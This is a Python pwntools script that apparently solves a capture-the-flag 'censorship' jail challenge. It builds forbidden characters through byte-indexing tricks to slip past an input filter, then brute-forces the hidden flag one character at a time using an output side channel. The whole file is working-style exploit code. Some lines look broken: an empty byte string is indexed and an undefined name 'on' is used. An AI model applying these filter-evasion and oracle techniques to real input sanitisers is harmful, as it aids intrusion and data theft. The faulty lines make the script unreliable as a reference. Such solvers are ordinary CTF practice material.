from pwn import *
from string import ascii_letters

context.update(
    terminal='kitty',
    log_level='info'
)

send = lambda msg: p.sendlineafter(b'Give code: ', msg)
sendc = lambda msg: p.sendline(msg)
get = lambda : p.recvuntil(b'Give code: ', drop=True)

# p = remote('amt.rs', 31672)
p = process(['python', 'lite++Censorship.py'])

# set some variable
send(b"b=''=='';s=''!='';arr='x';IDX=s") # b = True / 1, s = False / 0, arr = array for checking, IDX = index set 0
# send(br"L=b'k'[s]+b;L='%c'%L") # l
# send(br"I=b'h'[s]+b;I='%c'%I") # i
# send(br"T=b's'[s]+b;T='%c'%T") # t
# send(br"E=b'd'[s]+b;E='%c'%E") # e
# send(br"CL=b'z'[s]+b;T='%c'%CL") # {
# send(br"CR=b'|'[s]+b;CR='%c'%CR") # }

send(br"L=b''[s]+b'!'[s]+b;L='%c'%L")
send(br"I=b'H'[s]+b'!'[s];I='%c'%I")
send(br"T=b'T'[s]+b'!'[s]+~s;T='%c'%T")
send(br"E=b'E'[s]+b'!'[s]+~s;E='%c'%E")
send(br"CL=b'|'[s]+~s;CL='%c'%CL")
send(br"CR=b'|'[s]+on;CR='%c'%CR")

flag = ''
while not flag.endswith("}"):
    for c in ascii_letters + '_{}':
        payload = b"arr[_[IDX]=="
        if c in r"lite{}":
            sp = c
            if c == "{":
                sp = "CL"
            elif c == "}":
                sp = "CR"
            payload += sp.upper().encode("utf-8") + b"]"
        
        else:
            payload += b"'" + c.encode("utf-8") + b"']"

        get()
        sendc(payload)
        if b'zzzz' in get():
            sendc(b'IDX+=b')
            flag += c
            info(f'Flag : {flag}')
            break
        else:
            sendc(b'')

p.close()